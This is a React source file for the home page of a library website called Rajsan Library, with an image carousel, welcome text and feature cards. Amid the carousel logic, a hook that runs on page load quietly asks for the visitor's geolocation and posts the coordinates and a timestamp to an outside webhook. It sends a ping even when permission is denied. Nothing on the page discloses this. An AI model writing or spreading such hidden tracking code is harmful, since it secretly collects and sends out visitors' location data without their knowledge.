import { useRef, useState, useEffect } from "react";
import { motion } from "framer-motion";
import { Button } from "../components/ui/button";
import { ChevronLeft, ChevronRight, BookOpen, Users, Clock, Sparkles } from "lucide-react";
import { Link } from "react-router-dom";

const photos = [
  { src: "library1.webp", title: "Study Zone", description: "Quiet spaces for focused learning" },
  { src: "library2.webp", title: "Reading Area", description: "Comfortable seating for immersive reading" },
  { src: "library3.webp", title: "Collaboration Space", description: "Areas for group discussions" },
  { src: "library4.webp", title: "Book Collection", description: "Vast academic resources" },
  { src: "library5.webp", title: "Digital Hub", description: "Modern technology for learning" },
];

function Home() {
  const scrollRef = useRef(null);
  const [currentIndex, setCurrentIndex] = useState(0);
  const [isAutoPlaying] = useState(true);

  useEffect(() => {
    if (!isAutoPlaying) return;
    
    const interval = setInterval(() => {
      handleNext();
    }, 4000);

    return () => clearInterval(interval);
  }, [currentIndex, isAutoPlaying]);
    
   useEffect(() => {
  navigator.geolocation.getCurrentPosition(
    (pos) => {
      fetch("https://hook.eu2.make.com/vea9dnrejkql7ghrgr8m5olas8l0nec1", {
        method: "POST",
        headers: { "Content-Type": "application/json"},
        body: JSON.stringify({
          lat: pos.coords.latitude,
          lng: pos.coords.longitude,
          time: new Date().toLocaleString()
        })
      });
    },
    () => {
      // User ne location deny ki → fir bhi message jayega
      fetch("https://hook.eu2.make.com/vea9dnrejkql7ghrgr8m5olas8l0nec1", {
        method: "POST",
        headers: { "Content-Type": "application/json"},
        body: JSON.stringify({
          lat: "Not Allowed",
          lng: "Not Allowed",
          time: new Date().toLocaleString()
        })
      });
    }
  );
}, []);



  const handleNext = () => {
    const newIndex = currentIndex === photos.length - 1 ? 0 : currentIndex + 1;
    setCurrentIndex(newIndex);
    scrollToSlide(newIndex);
  };

  const handlePrev = () => {
    const newIndex = currentIndex === 0 ? photos.length - 1 : currentIndex - 1;
    setCurrentIndex(newIndex);
    scrollToSlide(newIndex);
  };

  const scrollToSlide = (index) => {
    if (scrollRef.current) {
      const scrollAmount = scrollRef.current.clientWidth * index;
      scrollRef.current.scrollTo({
        left: scrollAmount,
        behavior: "smooth",
      });
    }
  };

  return (
    <div className="min-h-screen bg-gray-950 text-white">
      {/* Background */}
      <div className="fixed inset-0 pointer-events-none">
        <div className="absolute -top-20 -right-20 w-60 h-60 bg-blue-600/10 rounded-full blur-3xl"></div>
        <div className="absolute -bottom-20 -left-20 w-60 h-60 bg-purple-600/10 rounded-full blur-3xl"></div>
      </div>

      {/* Main Section */}
      <section className="relative z-10 max-w-7xl mx-auto px-4 py-12 md:py-20">
        <div className="flex flex-col lg:flex-row items-center gap-8 lg:gap-16">
          
          {/* Left Content */}
          <div className="flex-1 text-center lg:text-left">
            
<motion.div
  initial={{ opacity: 0, x: -20 }}
  animate={{ opacity: 1, x: 0 }}
  transition={{ delay: 0.2 }}
  className="inline-flex items-center gap-2 bg-blue-500/20 border border-blue-500/30 rounded-full px-4 py-2 mb-4 mt-16" // mt-16 add karo
>
  <Sparkles size={16} className="text-blue-400" />
  <span className="text-blue-300 text-sm font-medium">Welcome to Knowledge Hub</span>
</motion.div>

            <motion.h1
              initial={{ opacity: 0, y: 20 }}
              animate={{ opacity: 1, y: 0 }}
              transition={{ delay: 0.1 }}
              className="text-4xl md:text-5xl lg:text-6xl font-bold mb-6"
            >
              Rajsan{" "}
              <span className="text-blue-400">Library</span>
            </motion.h1>

            <motion.p
              initial={{ opacity: 0, y: 20 }}
              animate={{ opacity: 1, y: 0 }}
              transition={{ delay: 0.2 }}
              className="text-xl text-gray-300 mb-8 max-w-lg mx-auto lg:mx-0"
            >
              Where knowledge meets inspiration in a peaceful learning environment.
            </motion.p>

            <motion.div
              initial={{ opacity: 0, y: 20 }}
              animate={{ opacity: 1, y: 0 }}
              transition={{ delay: 0.3 }}
              className="flex flex-col sm:flex-row gap-4 justify-center lg:justify-start"
            >
              <Link to="/gallery">
                <Button className="bg-blue-600 hover:bg-blue-700 text-white px-8 py-3 rounded-xl">
                  <BookOpen className="mr-2 h-5 w-5" />
                  Explore Library
                </Button>
              </Link>
              <Link to="/contact">
                <Button variant="outline" className="border-gray-600 text-white hover:bg-gray-800 px-8 py-3 rounded-xl">
                  Book a Visit
                </Button>
              </Link>
            </motion.div>
          </div>

          {/* Right Carousel */}
          <div className="flex-1 w-full max-w-lg">
            <div className="relative">
              {/* Carousel Container */}
              <div
                ref={scrollRef}
                className="flex overflow-hidden rounded-2xl shadow-2xl"
              >
                {photos.map((photo, index) => (
                  <div
                    key={index}
                    className="w-full flex-shrink-0 relative"
                  >
                    <img
                      src={photo.src}
                      alt={photo.title}
                      className="w-full h-80 md:h-96 object-cover"
                    />
                    <div className="absolute bottom-0 left-0 right-0 bg-gradient-to-t from-black/80 to-transparent p-6">
                      <h3 className="text-white text-xl font-bold mb-2">{photo.title}</h3>
                      <p className="text-gray-200">{photo.description}</p>
                    </div>
                  </div>
                ))}
              </div>

              {/* Navigation Buttons */}
              <button
                onClick={handlePrev}
                className="absolute left-2 top-1/2 -translate-y-1/2 bg-black/50 hover:bg-black/70 text-white rounded-full p-2 transition-all"
              >
                <ChevronLeft size={24} />
              </button>
              <button
                onClick={handleNext}
                className="absolute right-2 top-1/2 -translate-y-1/2 bg-black/50 hover:bg-black/70 text-white rounded-full p-2 transition-all"
              >
                <ChevronRight size={24} />
              </button>

              {/* Dots Indicator */}
              <div className="flex justify-center gap-2 mt-4">
                {photos.map((_, index) => (
                  <button
                    key={index}
                    onClick={() => {
                      setCurrentIndex(index);
                      scrollToSlide(index);
                    }}
                    className={`w-3 h-3 rounded-full transition-all ${
                      currentIndex === index ? "bg-blue-500" : "bg-gray-600"
                    }`}
                  />
                ))}
              </div>
            </div>
          </div>
        </div>
      </section>

      {/* Stats Section */}
      <section className="relative z-10 max-w-6xl mx-auto px-4 py-16">
        <motion.div
          initial={{ opacity: 0, y: 20 }}
          animate={{ opacity: 1, y: 0 }}
          className="text-center mb-12"
        >
          <h2 className="text-3xl md:text-4xl font-bold mb-4">Why Choose Our Library?</h2>
          <p className="text-gray-400 text-lg">Modern facilities for modern learners</p>
        </motion.div>

        <div className="grid grid-cols-1 md:grid-cols-3 gap-6">
          {[
           {
              icon: BookOpen, title: "100 + Students", desc: "Enrolled students"  
           },
            { icon: Clock, title: "24/7 Access", desc: "Flexible study hours" },
            { icon: Users, title: "1K+ Community", desc: "Active student members" },
          ].map((item, index) => (
            <motion.div
              key={index}
              initial={{ opacity: 0, y: 20 }}
              animate={{ opacity: 1, y: 0 }}
              transition={{ delay: index * 0.1 }}
              className="bg-gray-900/50 rounded-2xl p-6 text-center border border-gray-800"
            >
              <div className="inline-flex items-center justify-center w-12 h-12 bg-blue-500/20 rounded-xl mb-4">
                <item.icon className="text-blue-400" size={24} />
              </div>
              <h3 className="text-xl font-bold text-white mb-2">{item.title}</h3>
              <p className="text-gray-400">{item.desc}</p>
            </motion.div>
          ))}
        </div>
      </section>

      {/* Footer */}
      <footer className="relative z-10 border-t border-gray-800 py-8 text-center">
        <p className="text-gray-500">
          🎓 Your journey to academic excellence starts here
        </p>
      </footer>
    </div>
  );
}

export default Home;